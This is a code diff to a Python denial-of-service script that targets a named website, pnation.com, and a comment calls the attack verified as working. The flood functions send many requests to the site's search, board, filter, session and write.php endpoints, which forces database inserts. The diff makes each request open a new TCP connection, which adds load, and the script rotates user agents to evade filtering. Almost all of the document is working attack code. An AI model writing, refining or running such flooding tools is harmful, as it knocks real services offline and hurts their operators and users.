@@ -19,6 +19,12 @@ import sys
 import json
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Disable keep-alive — force new TCP connection per request
+def mk_sess():
+    s = requests.Session()
+    s.headers["Connection"] = "close"
+    return s
 from concurrent.futures import ThreadPoolExecutor
 
 TARGET = "https://pnation.com"  # v2: 域名攻击（已验证生效）
@@ -47,7 +53,7 @@ def flood_ajax_filter():
         "union", "select", "drop", "insert", "update", "delete",
     ] + ["".join(random.choices(string.ascii_lowercase, k=random.randint(4, 20))) for _ in range(30)]
 
-    sess = requests.Session()
+    sess = mk_sess()
     sess.verify = False
     sess.headers.update({
         "Host": "pnation.com",
@@ -77,7 +83,7 @@ def flood_ajax_filter():
 # ===========================
 def flood_board():
     bo_tables = ["free", "notice", "gallery", "qa", "etc"]
-    sess = requests.Session()
+    sess = mk_sess()
     sess.verify = False
     sess.headers.update({
         "Host": "pnation.com",
@@ -115,7 +121,7 @@ def flood_search():
         "テスト", "테스트", "テスト検索", "日本語テスト",
     ]
 
-    sess = requests.Session()
+    sess = mk_sess()
     sess.verify = False
     sess.headers.update({
         "Host": "pnation.com",
@@ -147,7 +153,7 @@ def flood_search():
 def flood_write():
     """POST to write.php — triggers DB INSERT, indexes, and session writes"""
     bo_tables = ["free", "notice", "qa", "gallery", "etc"]
-    sess = requests.Session()
+    sess = mk_sess()
     sess.verify = False
     sess.headers.update({
         "Host": "pnation.com",
@@ -191,7 +197,7 @@ def flood_session():
     ]
 
     while time.time() - stats["start_time"] < DURATION:
-        sess = requests.Session()
+        sess = mk_sess()
         sess.headers.update({
             "Host": "pnation.com",
             "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90,125)}.0.{random.randint(1000,9999)}.{random.randint(10,999)} Safari/537.36",
